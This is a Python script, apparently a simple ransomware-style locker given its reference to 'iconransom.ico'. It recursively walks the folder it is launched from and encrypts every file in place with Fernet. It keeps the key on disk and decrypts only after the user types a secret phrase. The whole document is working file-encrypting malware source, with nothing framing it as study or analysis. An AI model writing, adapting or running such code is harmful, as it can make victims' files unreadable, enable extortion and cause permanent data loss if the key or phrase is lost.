import os
from cryptography.fernet import Fernet
import sys
yn = ["nee", "n", "no", "nah", "nope", "N", "No", "NO", "Nee", "NEE", "Nope", "NOPE", "ja", "yah", "yes", "j", "yeah", "yep", "sure", "jep", "y", "jah", "Yes", "Y", "Yeah", "Ja"]
sys.dont_write_bytecode = True


self_exe = os.path.basename(sys.executable)
self = os.path.basename(__file__)


affected_files = []
direct = []



if os.path.exists("keycode.key"):
    with open("keycode.key", "rb") as thekeycode:
        keycode = thekeycode.read()
else:
    keycode = Fernet.generate_key()
    with open("keycode.key", "wb") as thekeycode:
        thekeycode.write(keycode)
   
    

if os.path.exists("code.txt"):
    ch_ans = input("do you want to change your code?(y/n) ")
    while ch_ans not in yn:
        ch_ans = input("do you want to change your code?(y/n) ")
    if ch_ans == "y":
        del ch_ans
        with open("code.txt", "rb") as thecode:
            code = Fernet(keycode).decrypt(thecode.read())
        code = code.decode("utf-8")
        ch_ans = input("enter current code: ")
        if ch_ans == code:
            del ch_ans
            ch_ans = input("what do you want your new code to be? ")
            while ch_ans == "":
                ch_ans = input("what do you want your new code to be? ")
            ch_ans = ch_ans.encode("utf-8")
            with open("code.txt", "wb") as thecode:
                thecode.write(Fernet(keycode).encrypt(ch_ans))
            del ch_ans
        else:
            print("code does not match!")
    else:
        with open ("code.txt", "rb") as thecode:
            contcode = thecode.read()
        code = Fernet(keycode).decrypt(contcode)
        code = code.decode("utf-8") 
else:    
    tcode = input("enter a secret code: ")
    while tcode == "":
        tcode = input("enter a secret code: ")
    code = tcode.encode("utf-8")
    code_enc = Fernet(keycode).encrypt(code)
    with open("code.txt", "wb") as thecode:
        thecode.write(code_enc)
with open ("code.txt", "rb") as thecode:
    contcode = thecode.read()
code = Fernet(keycode).decrypt(contcode)
code = code.decode("utf-8") 

with open("start_dir.txt", "w") as f:
    f.write(os.getcwd())


with open("start_dir.txt", "r") as f:
    start_dir = f.read()


os.remove("start_dir.txt")

direct = []

def get_files_in_direct():

    os.chdir(start_dir)
    
    for file in os.listdir():
        if file == self or file == self_exe or file == "thekey.key" or file == "iconransom.ico" or file == "code.txt" or file == "keycode.key":
            continue
        if os.path.isfile(file):
            affected_files.append(file)
        elif os.path.isdir(file):
            pc = os.getcwd()
            os.chdir(file) 
            direct.append(os.getcwd())
            os.chdir(pc)

    for directory in direct:
        os.chdir(directory)
        for file in os.listdir():
            if os.path.isfile(file):
                affected_files.append(file)
            if os.path.isdir(file):
                pc = os.getcwd()
                os.chdir(file) 
                direct.append(os.getcwd())
                os.chdir(pc)
    os.chdir(start_dir)
    
get_files_in_direct()

direct.append(start_dir)


os.chdir(start_dir)

    
if os.path.exists("thekey.key"):
    with open("thekey.key", "rb") as thekey:
        key = thekey.read().decode("utf-8")
    first_try = False
else:    
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    first_try = True


    
if first_try:
    print("Encrypting...")
    for d in direct:
        os.chdir(d)
        for file in os.listdir():
            if file in affected_files:
                with open(file, "rb") as thefile:
                    cont = thefile.read()
                encr_cont = Fernet(key).encrypt(cont)
                with open(file, "wb") as thefile:
                    thefile.write(encr_cont)
            else: 
                continue   
    

    
print(affected_files)
print(direct)
print("\nAll the above files have been encrypted.\nUnlock files:")

os.chdir(start_dir)  
  

user_code = input("secret phrase: ")

while not user_code == code:
    user_code = input("secret phrase: ")
    
print("Decrypting...")
for d in direct:
    os.chdir(d)
    for file in os.listdir():
        if file in affected_files:
            with open(file, "rb") as thefile:
                cont = thefile.read()
            decr_cont = Fernet(key).decrypt(cont)
            with open(file, "wb") as thefile:
                thefile.write(decr_cont)
        else: 
            continue

os.remove("thekey.key")

print("Congrats, you can now close this window!")

input()